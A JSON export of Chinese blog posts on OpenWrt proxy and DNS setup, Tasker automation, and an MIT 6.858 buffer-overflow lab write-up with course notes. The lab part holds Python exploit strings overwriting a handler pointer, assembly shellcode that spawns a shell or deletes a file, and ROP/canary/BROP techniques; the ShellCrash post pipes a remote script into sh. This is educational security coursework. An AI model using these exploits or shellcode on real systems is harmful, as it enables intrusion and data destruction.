[ { "title": "OpenWrt 下安装和使用 Clash (ShellCrash)", "url": "/posts/how-to-use-clash-on-openwrt/", "categories": "Tutorial, Clash", "tags": "OpenWrt, Clash", "date": "2023-11-13 00:00:00 +0800", "snippet": "简介Clash 是非常流行的流量代理软件，特别是很多机场将其作为首选的客户端。而其中的 ShellCrash（这里没有拼写错误，并不是 ShellClash） 则是包括 OpenWrt 在内的一众 Linux 系统最佳 Clash 客户端之一，其最大亮点是安装配置非常便捷、Linux 友好、支持 Web 图形界面。下文就介绍如何在 OpenWrt（本文使用 23.5.0）下快速安装配置 ShellCrash。当然，其他基于 Linux 系统理论上也是适用的。安装 ShellCrashSSH 进入系统后，按照 ShellCrash 项目主页在线安装的命令进行安装，这里推荐使用作者私人源进行安装，因为此时的路由器通常访问 Github 速度慢甚至无法访问：export url=&#39;https://gh.jwsc.eu.org/master&#39; &amp;amp;&amp;amp; sh -c &quot;$(curl -kfsSl $url/install.sh)&quot; &amp;amp;&amp;amp; source /etc/profile &amp;amp;&amp;gt; /dev/null根据提示进行安装即可。这里 ShellCrash 对于安装目录空间不足 10MB 的设备会提示是否开启小闪存模式，使得核心及数据库文件会被下载到内存中，但实际上博主实测完整安装 ShellCrash 只需不到 5MB 空间。配置和启动 ShellCrash安装完 ShellCrash 后就可以直接执行 clash 命令进行运行前的最后配置，我们根据提示进入导入Clash配置文件链接功能，将订阅链接粘贴导入进去，并根据提示重启 Clash 服务。到这里就基本大功告成了，接下来我们需要一个管理订阅规则的控制面板。有多种控制面板可供选择，你可以通过访问在线地址来直接使用控制面板： 面板类型 在线地址 Clash 官方面板 http://clash.razord.top Razord-meta 面板 http://clash.metacubex.one yacd 面板 http://yacd.haishan.me Yacd-meta 面板 http://yacd.metacubex.one metacubexd 面板 http://d.metacubex.one 使用在线控制面板时需要配置主机的 host 和端口（ShellCrash 启动 Clash 时提示），但如果你的 host 非 https，那么你应该确保访问在线面板的 http 版本，否则将被浏览器拒绝连接。当然，也可以直接将面板安装到 OpenWrt 上：直接通过 ShellCrash 的更新/卸载选项进入安装本地Dashboard面板功能即可执行安装，例如：-----------------------------------------------安装本地版dashboard管理面板打开管理面板的速度更快且更稳定-----------------------------------------------请选择面板安装类型：----------------------------------------------- 1 安装官方面板(约500kb) 2 安装Meta面板(约800kb) 3 安装Yacd面板(约1.1mb) 4 安装Yacd-Meta魔改面板(约1.5mb) 5 安装MetaXD面板(约1.5mb) 6 卸载本地面板 0 返回上级菜单博主选择其中的 yacd 面板:安装完成后，根据提示访问 http://192.168.0.1:9999/ui/ 即可通过面板来对订阅的规则进行配置。其他配置定时更新订阅通过设置定时任务可以定时更新订阅、重启 Clash 服务。让路由器本机也通过 Clash 流量代理默认情况下，ShellCrash 不会让路由器本机也代理流量，如果要让路由的流量也可以被代理，可以通过 clash功能设置-设置本机代理服务来开启这一功能。" }, { "title": "使用 Stubby 实现 DNS Over TLS", "url": "/posts/dns-over-tls-with-stubby-on-openwrt/", "categories": "Tutorial, OpenWrt", "tags": "", "date": "2021-12-19 00:00:00 +0800", "snippet": "介绍Stubby 是一款跨平台的 DNS Over TLS（DOT）本地代理，本文介绍了 OpenWrt 平台上安装配置 Stubby 并对接现有的 DNS 基础设施 ，使得明文 DNS 请求发送给 OpenWrt（Dnsmasq）后，再由 Stubby 加密发送给支持 DOT 的 DNS 服务器。安装&amp;amp;配置 Stubby使用 opkg install stubby 命令或在 OpenWrt Web 界面搜索 stubby 安装。Stubby 暂时还没有 LuCi 界面，uci 格式配置文件 位于 /etc/config/stubby（根据文档，当选项 manual 配置为 ‘1’ 时忽略 uci 配置文件，使用 /etc/stubby/stubby.yml ）。默认配置下 Stubby 监听 127.0.0.1@5453 和 0::1@5453 以及使用 Cloudflare 的 DOT 服务器作为上游 DNS，这是我们最关心的两个配置。根据使用目的不同，配置方案分为： 场景一方案 - 修改上游 DNS 服务为国内 DOT 服务器（例如例子中的阿里和腾讯），成为「国内安全 DNS」：config stubby &#39;global&#39; option manual &#39;0&#39; option trigger &#39;wan&#39; # option triggerdelay &#39;2&#39; list dns_transport &#39;GETDNS_TRANSPORT_TLS&#39; option tls_authentication &#39;1&#39; option tls_query_padding_blocksize &#39;128&#39; # option tls_connection_retries &#39;2&#39; # option tls_backoff_time &#39;3600&#39; # option timeout &#39;5000&#39; # option dnssec_return_status &#39;0&#39; option appdata_dir &#39;/var/lib/stubby&#39; # option trust_anchors_backoff_time 2500 # option dnssec_trust_anchors &#39;/var/lib/stubby/getdns-root.key&#39; option edns_client_subnet_private &#39;1&#39; option idle_timeout &#39;10000&#39; option round_robin_upstreams &#39;1&#39; list listen_address &#39;127.0.0.1@5453&#39; list listen_address &#39;0::1@5453&#39; # option log_level &#39;7&#39; # option command_line_arguments &#39;&#39; # option tls_cipher_list &#39;EECDH+AESGCM:EECDH+CHACHA20&#39; # option tls_ciphersuites &#39;TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256&#39; # option tls_min_version &#39;1.2&#39; # option tls_max_version &#39;1.3&#39;# Upstream resolvers are specified using &#39;resolver&#39; sections.config resolver option address &#39;223.5.5.5&#39; option tls_auth_name &#39;dns.alidns.com&#39;config resolver option address &#39;223.6.6.6&#39; option tls_auth_name &#39;dns.alidns.com&#39; config resolver option address &#39;162.14.21.178&#39; option tls_auth_name &#39;dot.pub&#39; 场景二方案 - 保持默认配置（Cloudflare）不变，作为「国外安全 DNS」使用。显然，场景二的用法在国内大概率会因为 GFW 的作用（DNS 污染）而异常。本文后续基于场景一设置。关于 Stubby 配置项： 配置多个上游 DNS resolver 时，Stubby 将按序使用这些 DNS，解析失败时根据重试要求切换至后继的 resolver。 address IP 指示服务器 IP，一方面用于发起 TLS 连接，另一方面当 DOT 连接失败时将回退到传统明文 DNS（当然，默认是禁止回退的） 仅当 tls_authentication 选项配置为 ‘GETDNS_AUTHENTICATION_NONE’(0) 才允许回退明文 DNS，该选项默认是 ‘GETDNS_AUTHENTICATION_REQUIRED’(1) ，即禁止回退。启动 Stubby更新 Stubby 配置文件后要在 LuCi - System - Startup 界面点击重启 Stubby 即可。如果需要手动启动 Stubby，通过 ps 命令可以观察到 Stubby 实际启动命令是 /usr/sbin/stubby -C /var/etc/stubby/stubby.yml其中 stubby.yml 的内容如下：tls_authentication: GETDNS_AUTHENTICATION_REQUIREDtls_query_padding_blocksize: 128edns_client_subnet_private: 1idle_timeout: 10000listen_addresses: - 127.0.0.1@5453 - 0::1@5453dns_transport_list: - GETDNS_TRANSPORT_TLSupstream_recursive_servers: - address_data: 223.5.5.5 tls_auth_name: &quot;dns.alidns.com&quot; - address_data: 223.6.6.6 tls_auth_name: &quot;dns.alidns.com&quot; - address_data: 162.14.21.178 tls_auth_name: &quot;dot.pub&quot;可见 Stubby 其实是将 uci 格式转换为原生配置格式后再用来启动的。因此可以采用下面的命令来手动启动 Stubby 进程，来实现多 Stubby 运行实例（注意：不同进程配置监听不同的端口）：/usr/sbin/stubby -C stubby.yml对接下游 DNSStubby 启用后只是在本地启用了一个 DNS 代理，要真正利用起来还需要根据个人网络环境不同，对接相应的下游 DNS 服务器。对接 Dnsmasq进入 Luci - Network - DHCP and DNS，将 DNS forwardings 配置为 127.0.0.1#5453，打开 Ignore resolve file 选项。这是最简单的方式，Stubby 全局接管 DNS 请求，适用于只需要 DOT 功能无需国际上网的用户。对接 ChinaDNS（不可行）因为 ChinaDNS 无法显式指定上游 DNS 是国内还是国外（可信），而是自动根据 DNS 的 IP 地址是否是国内来判断「国内 DNS」和「国外 DNS」，想将 127.0.0.1:5453 添加到 ChinaDNS Upstream Servers 作为国内 DNS 的意图实测将会失效（会被误判成国外 DNS，导致解析结果非预期）。具体原因细节参见博主的另外一篇博客《OpenWrt Shadowsocks 安装&amp;amp;配置指南》- 配置 ChinaDNS 章节末的对 ChinaDNS 上游 DNS 行为的解释。对接 ChinaDNS-NG由于 ChinaDNS 的缺陷 ，因此升级为 ChinaDNS-NG 进行对接。方法很简单，将其 China DNS Servers 选项配置为 Stubby 的 127.0.0.1#5453 即可。测试进入 Cloudflare - Browsing Experience Security Check 执行检测，观察第一个检查项 Secure DNS 是否 OK。注：可能需要临时修改 Dnsmasq 的上游 DNS 为 Stubby 来通过测试。" }, { "title": "使用 Tasker", "url": "/posts/using-tasker/", "categories": "Tutorial, Tasker", "tags": "", "date": "2021-12-18 00:00:00 +0800", "snippet": "介绍Tasker 是一款功能强大的 Android 自动化 APP。本文记录了 Tasker 常用基础知识以及一些自动化场景，文章内容后续会不断更新。Tasker 基础Tasker 基本组件 Project：将 Tasker profiles, tasks, scenes 和 variables（全局变量） 进行逻辑分组，以方便管理。可以给 Project 设置直观的图标。 Profile：触发 Task 的环境上下文，比如时间、地点、事件、应用等等，必须关联到 Task。 Task：Task 代表一个具体的任务，由一至多个具体的 Action 组成，Task 可类比于函数，Action 则是组成函数的一行行代码（具体指令）。 Action：Tasker 任务的最小执行单位，包括通知、文件读写、HTTP 请求、系统配置甚至第三方插件等等。值得注意 If/Else 等条件分支语句也是一类 Action。丰富的 Action 是 Tasker 强大功能的基石。变量Tasker 用 「%变量名」表示一个变量，其中 全局变量：变量名含一个或多个大写字母，比如 %Car，%SMS_BODY，作用域是整个 Tasker 程序。在 Tasker 主页 - VARS 页签定义全局变量。 局部变量：全部为小写字母，作用域是 Task。在 Task 内使用 Variable Set Action 来定义。变量处理字符串匹配和提取按一定的模式处理字符串变量，用来提取字符串中的关键词，支持正则表达式。 simple match/regex 简单匹配/正则简单匹配例子：my name is $name, #old years old上面的公式 $ 表示任意字符串 # 表示任意数字，匹配的结果将生成对应的 %name 和 %old 两个局部变量，用于后续访问。因为一个 pattern 可能匹配多次，可以用 name(数字) 来访问指定第 n 个匹配结果。正则表达式例子：(?&amp;lt;variable&amp;gt;reg) 上面的例子使用命名捕获组，匹配结果将会存在 %variable 变量 search and replace比较少用，容易误用： 不支持正则表达式的捕获组，比如表达式 (group1)(group2) ，实际会忽略 ()； Store Matches In Array 的意思是将捕获的结果存储在数组变量中，ret1 是访问匹配到的第一个结果，而不是正则表达式中的捕获组 1。变量结构化解析对于结构化的变量，比如来自 web 的 HMTL、JSON 响应，如果要解析内容，办法之一是用前面提到的模式匹配，但存在不直观、仅适用于简单情形的问题。新版本 Tasker 开始支持 JSON 等结构化变量解析，语法十分简单，直接参考官方文档即可。Task 参数和返回值前文提到 Task 类比于函数，函数有入参和返回值，Tasker Task 之间可以互相调用，同样也有参数和返回值。这套机制使得 Task 功能更多样以及更容易复用。Tasker 为每一个 Task 隐式创建了 %part1、%par2 两个局部变量，用来保存该 Task 的入参，调用者 Task 通过 Perform Task Action 来调用被调 Task 时，可以指定是否传递参数，以及指定用于接收返回值的变量，而被调用 Task 则一方面直接通过 %part1、%part2 使用入参，另一方面通过 Return Action 来传递回返回值。具体做法：Tasker 应用场景HTTP 请求Tasker 的 HTTP Request Action 可以用来实现自动签到等功能，关于 HTTP Request 总结如下： 该 Action 用于发起 HTTP 请求，可定制 Method（GET/POST）、Headers 等参数 执行后会输出若干变量，其中最重要的是用于存放请求响应的 %http_data。 Task 在处理响应时候，可以用变量处理的若干方法来提取有用的信息，特别是新版的结构化变量读取功能，可以方便地解析 JSON/HTML 等格式响应信息。注意：变量结构化解析依赖 HTTP Request 打开 Structure Output(JSON, etc) 选项。 如果需要 Tasker 管理 Cookie，而不是请求参数中手动设置，勾选 User Cookies 选项。Wake On LAN自动化 Wake On LAN 是一个非常实用的场景，指定手机打开特定应用时自动唤醒 NAS、PC 等局域网设备。Tasker 本体并不支持 WOL，但调用插件/三方应用来扩展实现，推荐用 Google Play 的 Wake On Lan。具体方法是：先配置好可用的 WOL 目标，然后进入 Tasker 创建关联的 WOL Task 调用（Plugin Action），最后新建一个 Event - Application Profile，将 Profile 绑定到 WOL task 即可。如果不想每次启动应用都触发 WOL，可以长按 Profile，设置一下 Cooldown Time 参数。自动化 Shadowsocks 连接对于家里有 Shadowsocks 透明代理环境的，回家时一般会手动关闭手机上的 Shadowoscks，出门时又要手动开启。这一场景可通过 Tasker 可以实现自动化：根据目标 WiF 连接状态i，来开启关闭手机上的 Shadowsocks 连接。具体过程： 分别创建两个 Shadowsocks Plugin Action Task，其中一个 Task 开启 Shadowsocks，另一个是关闭。 新建一个 State Profile，选择 Net - Wifi Connected，其中 SSID 填写 WiFi 的 SSID，Active 选择 Any。 将 Profile 分别关联到先前创建的两个 Action，其中关闭 Shadowsocks 作为 Exit Task 即可" }, { "title": "MIT 6.858 lab 1 - Buffer overflows", "url": "/posts/mit-6858-lab-1-buffer-overflows/", "categories": "MIT 6.858, lab", "tags": "", "date": "2021-11-26 00:00:00 +0800", "snippet": "zook 代码解读 zookld：负责根据配置启动进程，包括 zookd（Web服务，负责分发），zook http 服务和 zookfs 另外一个服务。zookld 会在 main() 中打开并经监听指定的端口（默认 80，是 Web 服务器对外接口），然后将此端口发给 zookd 使用。 start_server() 起一个 HTTP socket，根据配置文件是 8080 而不是默认的 80； NCONF_get_string 从 .conf 文件中提取目标配置信息，然后 launch_svc 拉起 zookd（通过 execve 可执行文件），负责分发请求，launch_srv() 会创建一对 socketpair，将服务的 fd 放在 svcfds[] ，用于内部进程间通信。 zookd 第一个拉起，所以 svcfds[0] 是 zookd。 使用 NCONF_get_string 从配置文件中读出 http_svcs 配置（负责 HTML 等静态页面，从配置来看二进制共用的 zookfs_svc），用 CONF_parse_list 最终也 launch_svc() 出一个 http zook 服务，作为第二个拉起的服务放在 svcfds[1]； 把 1 创建的 http socket 和 3 创建的 http zook 服务的 socket 传给步骤 2 的 zookd； 从配置文件中读出 url pattern 发给 zookd。就是每个服务配置文件中的 url 配置项 最后创建其它非 http 的服务，这里是 conf 中 extra_svcs 项配置的 zookfs 也就是第三个服务。 zookd：接收客户端的请求，在 process_client() 中处理请求，根据 URL path patern 转发给某一个 http 服务处理 http_request_line()，从客户端的请求中提取 path 到 reqpath，提取各种 HTTP 请求信息到 env，如 method、protocol 等等，保存到环境变量。 zookfs：这个进程同时包含 http 服务和其它 non-http 的 cgi 服务，其中 http_request_headers() 解析请求中的 header 信息，保存到环境变量； http_serve 处理请求，根据路径分发给相应 handler：http_serve_directory 处理目录（html）、http_serve_executable 处理 cgi 脚本。 exercise 1. 寻找 bug[zookd.c:70]process_client 函数的 reqpath 可能被 http_request_line 接收的客户端的 GET /foo.html HTTP/1.0 中的 path 栈溢出 char reqpath[2048]; // 实际当 path 超过 1007 字节后 [http.c:282] 提前溢出 ... if ((errmsg = http_request_line(fd, reqpath, env, &amp;amp;env_len)))[http.c:23]这里 pn 缓冲区可以被 name 入参栈溢出 char pn[1024]; snprintf(pn, 1024, &quot;/tmp/%s&quot;, name);[http.c:72]http_request_line 函数的 buf 会被客户端发送的请求溢出，当请求发送方的一行请求超大时。 static char buf[8192]; ... if (http_read_line(fd, buf, sizeof(buf)) &amp;lt; 0)[http.c:129]http_request_headers 函数这里 buf 会被客户端发送的请求溢出，当请求发送方的一行请求超大时。 static char buf[8192]; ... if (http_read_line(fd, buf, sizeof(buf)) &amp;lt; 0)[http.c:165]这里 value[512]/envvar[512] 会被 buf（客户端的请求当 header 数据）栈溢出 url_decode(value, sp); ... sprintf(envvar, &quot;HTTP_%s&quot;, buf); // 将 HTTP header 读出一个[http.c:282]这里 pn 会被来自客户端的 name 栈溢出(就是之前的reqpath)，当 path 是 1024 行 \\0 时 char pn[1024]; ... strcat(pn, name);exercise 2. 造成溢出选取 [http.c:282] 来做溢出：def build_exploit(shellcode): ## Things that you might find useful in constructing your exploit: ## urllib.quote(s) ## returns string s with &quot;special&quot; characters percent-encoded ## struct.pack(&quot;&amp;lt;I&quot;, x) ## returns the 4-byte binary encoding of the 32-bit integer x ## variables for program addresses (ebp, buffer, retaddr=ebp+4) path = &quot;/&quot; + &#39;A&#39;*1024 req = &quot;GET &quot; + path + &quot; HTTP/1.0\\r\\n&quot; + \\ &quot;\\r\\n&quot; return req选取 [http.c:165] 来溢出： req = &quot;GET / HTTP/1.0\\r\\n &quot; + \\ &quot;Content-type: &quot; + &quot;A&quot;*600 + \\ &quot;\\r\\n&quot;exercise 3. 编写 shellcode选用 [http.c:282] http_serve 函数来利用。首先，要控制程序的 program counter。很容易想到的是覆盖 http_serve() 的 ret address（但其实这里有一个陷阱）。按照课程教材，运行 gdb 获取 saved ebp 的内存地址，用教材自带的样例 shellcode，即打开一个 shell 来验证劫持是否成功，然后构造 exploit 如下：def build_exploit(shellcode): ## Things that you might find useful in constructing your exploit: ## urllib.quote(s) ## returns string s with &quot;special&quot; characters percent-encoded ## struct.pack(&quot;&amp;lt;I&quot;, x) ## returns the 4-byte binary encoding of the 32-bit integer x ## variables for program addresses (ebp, buffer, retaddr=ebp+4) path = &quot;/&quot; + &#39;A&#39;*1020 + &#39;SEBP&#39; + struct.pack(stack_retaddr+4) + shellcode req = &quot;GET &quot; + path + &quot; HTTP/1.0\\r\\n&quot; + \\ &quot;\\r\\n&quot; return req执行该 exploit 发现程序竟直接 crash 退出，并未如期望地执行 shellcoade。gdb 调试发现 http_serve() 返回时 eip 并不是我们期望的地址， 而是 41414141（‘AAAA’ ）—— 我们的 buf 垃圾填充。(gdb) nexti //使用 next、nexti、stepi 这些有用的 gdb 命令Program received signal SIGSEGV, Segmentation fault.0x41414141 in ?? ()这说明在返回值之前另外有某处存程序指针。结合代码和 gdb 观察，原来栈上 ret addr 之前（低地址）还有个 handler 函数跳转指针，大致画出溢出发生前栈内存排布如下： +---------------------+ | | | return addr 4 | | | +---------------------+ | | | saved ebp 4 |ebp | |----&amp;gt; +---------------------+ | | | foo,bar 8 | | | +---------------------+ | | | handler 4 | | | +---------------------+ | buf[1024] | | . | | . | | . | | . | | &quot;/home/httpd/lab&quot; |--&amp;gt; buf[0~14] +---------------------+ | |esp | |----&amp;gt; | |显然，为了跳开这个「陷阱」，溢出目标应该改为这个 handler 指针。修改后的 exploit 如下： path = &quot;/&quot; + &#39;A&#39;*1008 + struct.pack(&#39;&amp;lt;L&#39;, stack_saved_ebp + 8) + &#39;AAAA&#39;*2 + &#39;SEBP&#39; + &#39;SRET&#39; + shellcode req = &quot;GET &quot; + path + &quot; HTTP/1.0\\r\\n&quot; + \\ &quot;\\r\\n&quot;运行此 exploit 可以在服务器端响应看到 $，即打开了一个 shell。这里要注意，我们是使用单字节 string 来溢出，在内存中是直接顺序存储的，而 4 字节的指针则是按小端序（x86）存储（指针值的低位要放到低地址），因此要使用 struct.pack(&#39;&amp;lt;L&#39;, stack_saved_ebp + 8) 来转换顺序。下一步，按实验的要求，修改 shellcode 为 unlink（删除）指定文件。首先学习一下教材的样例 shellcode.S 是怎么写的，它的目标是调用 execve 系统调用来执行 /bin/sh。execve 系统调用的原型是：int execve(const char *pathname, char *const argv[], char *const envp[]);其中 pathname 是可执行文件的 pathname， argv[] 是 string 指针数组，指向要传递给该新程序的各个参数（ vector），其中 argv[0] 第一个参数约定是指向被执行文件的 filename（就是 pathname），argv 必须以 NULL 指针中断。envp[] 也是 string 指针数组，指向的字符串是 key=value 形式，代表该执行程序的将设置的环境变量。同样必须以 NULL 指针中断。shellcode.S 逐行解读如下：#include &amp;lt;sys/syscall.h&amp;gt;#define STRING &quot;/bin/sh&quot;#define STRLEN 7#define ARGV (STRLEN+1)#define ENVP (ARGV+4).globl main .type main, @function main: jmp calladdr //编译后机器码的第一个指令，就是跳转到末尾的 calladdr */ popladdr: /* 首先要把 syscall 的参数（在栈上）准备好 popl %esi /* 配合之前的 push STRING，这里 pop 恰好就把 STRING 的首地址放到了 esi，妙 */ movl %esi,(ARGV)(%esi) /* set up argv pointer to pathname */ /* esi 偏移 + 7（含null的字符串长度）*/ /* 紧跟着 STRING （含 NULL）后，放置 argv pointer */ xorl %eax,%eax /* get a 32-bit zero value */ movb %al,(STRLEN)(%esi) /* null-terminate our string */ /* 为 STING 末尾补足 NULL */ movl %eax,(ENVP)(%esi) /* set up null envp */ /* 填充 ENVP 为 NULL，等价于为 ARGV 补充了一个 NULL 截断 */ /* 接下来把准备好的参数，逐个放置到 register 中 */ movb $SYS_execve,%al /* syscall arg 1: syscall number */ movl %esi,%ebx /* syscall arg 2: string pathname */ leal ARGV(%esi),%ecx /* syscall arg 2: argv */ leal ENVP(%esi),%edx /* syscall arg 3: envp */ int $0x80 /* invoke syscall */ /* 执行 exit 系统调用，让程序安静地退出。 */ xorl %ebx,%ebx /* syscall arg 2: 0 */ movl %ebx,%eax inc %eax /* syscall arg 1: SYS_exit (1), uses */ //exit 的 syscall number 是 1 /* mov+inc to avoid null byte */ /* 这里不用立即数 1 是为了避免 shellcode 出现 NULL 字节 */ /* 以免 shellcode 传递过程中被截断 */ int $0x80 /* invoke syscall */ calladdr: call popladdr /* call 指令的作用，1. push 下一行代码的地址到栈，即 STRING 的地址；2. 进入 ppladdr 执行后续指令 .ascii STRINGlab1 的要求是系统调用替换成 unlink，删除掉 /home/httpd/grades.txt 文件。先了解一下 unlink 这个系统调用：int unlink(const char *pathname);只有一个参数，那比 execve 简单多了~ 修改后的 shellcode：#include &amp;lt;sys/syscall.h&amp;gt;#define STRING &quot;/home/httpd/grades.txt&quot;#define STRLEN 22#define PATHNAME (STRLEN+1).globl main .type main, @function main: jmp calladdr popladdr: popl %esi movl %esi,(PATHNAME)(%esi) /* set up PATHNAME pointer to pathname */ xorl %eax,%eax /* get a 32-bit zero value */ movb %al,(STRLEN)(%esi) /* null-terminate our string */ movb $9,%al inc %eax /* syscall arg 1: syscall number */ /* 这里不用 $SYS_exit 立即数是因为 syscall number 为 10 */ /* 对应 ascii 码为 \\n，在 http_read_line 处理时会替换成 0 */ movl %esi,%ebx /* syscall arg 2: string pathname */ int $0x80 /* invoke syscall */ xorl %ebx,%ebx /* syscall arg 2: 0 */ movl %ebx,%eax inc %eax /* syscall arg 1: SYS_exit (1), uses */ /* mov+inc to avoid null byte */ int $0x80 /* invoke syscall */ calladdr: call popladdr .ascii STRING" }, { "title": "MIT 6.858 Course 3 - Buffer Overflow Exploits and Defenses", "url": "/posts/mit-6858-course-3-buffer-overflow-exploits-and-defenses/", "categories": "MIT 6.858, Course", "tags": "", "date": "2021-11-26 00:00:00 +0800", "snippet": "buffer overflow 缓解措施（续上节）措施 3. 堆栈不可执行，硬件支持对内存读、写、执行的权限说明。例如，AMD 的 NX 位，Intel 的 XD 位，Windows DEP（Data Execution Prevention），Linux 的 Pax。可将栈标记为不可执行。一些系统强制 「W^X」，即可写和可执行不能同时存在，但也不支持动态生成代码（同时需要写和执行）。详见可执行空间保护。“w^r” 原则的缺点是会让动态生代码生成变得困难，典型例子是 JIT 编译，必须写代码到 page，这样就要先设置 write bit，然后又要去掉 write bit，然后设置 execute bit，整个个过程变得棘手。措施 4. 地址随机化基本原理就是攻击者要使用硬编码的内存地址，随机化阻止攻击者找到地址：就算攻击者可以在本地用 GDB 来识别真实地址，当在实际的运行环境，比如服务器，随机化地址又不一样了。绕过随机化办法，一种是直接破解随机化，比如随机化种子泄漏、随机化信息泄露；另一种是绕过，攻击者不跳转到具体的地址，而是用如堆喷射技术，用 shellcode 大面积覆盖掉堆，那很可能就刚好命中，或者用大量 NOP 指令来滑向最终的 shellcode。栈随机化：将栈移动到随机位置，或在栈中变量之间随机填充。攻击者难以猜测返回地址的位置，以及 shellcode 将会被插入到哪里。ASLR (Address Space Layout Randmization)：随机布置栈，堆，动态库。动态链接器为每个库选择随机位置，攻击者难以找到 system() 位置。但也存在以下问题： 在 32 位机器上，可随机比特不够大（1 比特用于区分内核/用户模式，12 比特用于内存映射页与页边界对齐），攻击者可能蛮力猜测位置。 攻击者利用 usleep() 函数，该函数可能位置有 2^16 个或 2^28 个。猜测 usleep(16) 地址并写入返回地址，观察程序是否挂起了 16 秒。 程序产生栈 trace 或错误消息包含指针。 攻击者利用 「Heap spraying」将 shellcode 填满内存，很可能随机跳到 shellcode。其它措施改动硬件，使得寄存器装入一个秘密的 key，编译时用 key 来 xor 指令，运行时再动态 xor 回来。这样即使攻击者已经植入了 shellcode，由于不知道 key，这样的 shellcode 仍然无法执行。缓冲区溢出防御的实践应用 gcc 和 MSV C缺省启用金丝雀 Linux 和 Windows 缺省包含ASLR和NX 界限检查不太常用，因为：性能代价，需重编译，误报。有时，有些漏报但零误报好于零漏报但有些误报针对这些消减措施，还有什么攻击方法？绕过数据不可执行 - Return Oriented Programmingvoid run_shell(){ system(&quot;/bin/bash&quot;);}void process_msg(){ char buf[128]; gets(buf);} +------------------+entry %ebp ----&amp;gt; | .. prev frame .. | | | | | +------------------+entry %esp ----&amp;gt; | return address | ^ &amp;lt;--Gets overwritten +------------------+ | with address ofnew %ebp ------&amp;gt; | saved %ebp | | run_shell() +------------------+ | | buf[127] | | | ... | | | buf[0] | |new %esp ------&amp;gt; +------------------+ 上面的例子，构造了一个可直接利用的缓冲区溢出漏洞。但实际环境没这么理想，像这样char *bash_path = &quot;/bin/bash&quot;;void run_cmd(){ system(&quot;/something/boring&quot;); // 比如 /bin/ls}void process_msg(){ char buf[128]; gets(buf);} 这个情况无法直接利用，但可以组合两个片段：一个是 system 函数，一个是 bash_path 参数，来构造参数控制的 system 函数 shellcode。具体办法是用 GDB 调试，找出各自的地址，然后，按照调用约定，构造栈帧： +------------------+entry %ebp ----&amp;gt; | .. prev frame .. | | | | | | - - - - - - - - | ^ | | |Address of bash_path + - - - - - - - - | | | | |Junk return addr for +------------------+ | system()entry %esp ----&amp;gt; | return address | |Address of system() +------------------+ |new %ebp ------&amp;gt; | saved %ebp | |Junk +------------------+ | | buf[127] | | | ... | |Junk | buf[0] | |new %esp ------&amp;gt; +------------------+ | 这么排布，是仿造函数调用那一刻的栈结构： | ... | +------------------+ | argument | The system() argument. +------------------+%esp ----&amp;gt; | return addr | Where system() should +------------------+ ret after it has finished. （对此不熟悉的可以专门了解一些函数调用时的入栈出栈过程。）那如果需要的 string 不存在呢？没关系，可以在栈上自己构造出来 :) ，此时栈就像下面的： | h\\0 | ^ | - - - - - - - - | | | /bas | | 每个地址对应的内存是 4 字节（1 word） | - - - - - - - - | | | /bin | | &amp;lt;--------------------+ | - - - - - - - - | | | | | | Address of bash_path-+ + - - - - - - - - | | | | | Junk return addr from system() +------------------+ |entry %esp -&amp;gt; | return address | | Address of system() +------------------+ |new %ebp ---&amp;gt; | saved %ebp | | Junk +------------------+ | | buf[127] | | | ... | | Junk | buf[0] | |new %esp ---&amp;gt; +------------------+ | 这个同样 work。接着，我们注意到上面的例子在 return address 处都随便设置了一个返回地址，因为并不妨碍例子中 bash 的运行（尽管实际返回时程序可能会 crash），但是如果对此返回再加精心构造，把一系列函数串起来，又会产生另外一种非常有趣而强大的攻击手段。为了实现「串起来」这一目的，要用到 gadgets。一个 gadget 例子：pop %eax // 将栈顶 pop 到 %eaxret // 将栈顶 pop 到 %eip就是一系列的小的汇编指令，可以用来构造更大型的 exploit，并且在现有程序（binaries）中找到这些 gadgets 并不难，有工具可以使用（例如 msfelfscan）。 | | ^ + - - - - - - + | | | | Address of bash_path -+ Fake calling + - - - - - - + | | frame for (4) | | | Address of pop/ret -+ system() + - - - - - - + | (3) | | | Address of system() + - - - - - - + | (2) | | | Address of bash_path -+ Fake calling + - - - - - - + | | frame for (1) | | | Address of pop/ret -+ system() +--------------+ |entry %esp-&amp;gt; |return address| | Address of system() +--------------+ |new %ebp --&amp;gt; | saved %ebp | | Junk +--------------+ | | buf[127] | | | ... | | Junknew %esp --&amp;gt; | buf[0] | | +--------------+ | 整个过程：缓冲区一次覆盖了 return addr，当程序 ret 时，eip 使用假的地址执行 system()，此时 esp 来到 (1)，按照调用约定，(2) 成为参数，system 返回时，将 esp 的地址弹出到 eip，准备执行 (1) 指令，同时 esp 来到 (2)，先执行 pop 来 esp 到 (3)，再 ret 将 (3) 的地址弹出到 eip，esp 来到 (4)，又是一次 system() 函数调用，返回后又是 pop、ret 循环往复……这个过程，从宏观层面看其实和传统的计算模型类似，就是提供一串指令序列，通过逐渐递增 instruction pointer，来指导 CPU 执行这串指令，而在上面的 ROP 中，stack pointer（esp）就是前述的 instruction pointer：利用栈来指导要执行的指令块，而指令块又回（ret）到到栈上，循环往复。综上，ROP 可以用来绕过数据不可执行，因为整个过程都只是利用内存中现成的代码块。绕过 Stack Canary基于以下三个假设，来绕过栈金丝雀 server 有一个 buf overflow 漏洞 如果金丝雀被破坏，server 会重启 进程重启以后 Canary 和 ASLR 等不再重新随机化 —— 当重启新进程采用 fork 来实现的时候，这个假设成立，因为会继承父进程的虚拟内存空间 那么，实施绕过的过程就不难理解：每次只覆盖 1 字节的 canary，如果程序没有发生 crash（对于远程攻击，可以用 socket 连接没断来判断），恭喜，猜对了一部分，如此反复直到探测出全部 canary。综合性的绕过 - Blind Return Oriented Programming（BROP）（论文）本节介绍的技术是在 64bit 环境，这里与 32bit 的主要区别在于：参数使用寄存器传递而非栈。BROP 的步骤：STEP 1. 找到一个 stop gadget所谓 stop 就是跳转到指定返回地址执行后会暂停程序（不是 crash），比如 sleep、loop。用类似于 stack canary 探测的方法，覆写 ret addr 后，大部分情况 server 会 crash，但是如果一切如常（socket 保持连结），那就是找到了STEP 2. 找到指令是 pop 栈的的 gadgets一旦找到了，stop gadget，就可以利用其进一步找到 pop gadgets，通过组合以下三个组件来实现目标 probe: 要探测是否是 pop gadget 的地址 stop: 一个 stop gadget 地址 crash: 导致 crash 的不可执行地址 (0x0)具体来说，在栈中构造例如下的 shellcode sleep(10) ^ ^+--- pop rax / \\| ret / \\| \\---&amp;gt;[stop] 0x5.... 0x5....| [trap] 0x0 0x0 &amp;lt;-----------------++----------[probe] 0x4...8 0x4...c --&amp;gt;xor rax, rax | Crash! （这里 xor ... 只是一个可能的例子） ret | 